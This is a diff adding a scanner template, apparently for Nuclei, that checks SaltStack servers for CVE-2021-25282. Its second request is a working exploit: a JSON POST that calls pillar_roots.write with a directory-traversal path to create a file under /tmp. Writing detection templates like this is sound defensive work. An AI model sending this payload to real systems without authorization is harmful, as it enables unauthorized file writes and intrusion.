@@ -1,0 +1,55 @@
+id: CVE-2021-25282
+info:
+  name: SaltStack pillar_roots File Write
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Built on Python, Salt uses simple and human-readable YAML combined with event-driven automation to deploy and configure complex IT systems.
+    An issue was discovered in SaltStack Salt before 3002.5 where the salt.wheel.pillar_roots.write method is vulnerable to directory traversal and file creation.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-25282
+    - https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/
+  tags: file-creation
+
+http:
+  - raw:
+      - |
+        GET /run HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "wheel_async"
+          - "runner_async"
+
+  - raw:
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"eauth":"auto","client":"wheel_async","fun":"pillar_roots.write","data":"test_data","path":"../../../../../../tmp/test_file"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: regex
+        part: body
+        regex:
+          - "salt/wheel/\\d+"
